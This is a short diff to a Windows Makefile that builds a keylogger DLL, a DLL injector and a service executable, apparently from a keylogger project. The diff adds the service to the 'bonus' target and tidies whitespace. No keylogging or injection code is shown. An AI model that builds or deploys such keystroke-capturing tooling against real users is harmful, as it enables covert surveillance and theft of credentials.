@@ -14,7 +14,7 @@ winkey.exe: $(SRCS) keylog\exemain.c
 svc.exe: service\svc.cpp
 	$(CC) $(FLAGS) -I keylog /Fe$@ $** user32.lib advapi32.lib wtsapi32.lib shell32.lib
 
-bonus: keylogger.dll injector.exe
+bonus: keylogger.dll injector.exe svc.exe
 
 keylogger.dll: keylog/keylogger.c keylog/init_logger.c keylog/sys_getter.c keylog/dllmain.c
 	cl /LD $(FLAGS) keylog\keylogger.c keylog\init_logger.c keylog\sys_getter.c keylog\dllmain.c /link user32.lib /Fe:keylogger.dll
@@ -24,7 +24,7 @@ injector.exe: keylog/injector.c $(RES_FILE)
 
 clean:
 	del /Q *.obj 2>nul
-	
+
 fclean: clean
 	@echo "Cleaning up..."
 	start svc.exe stop
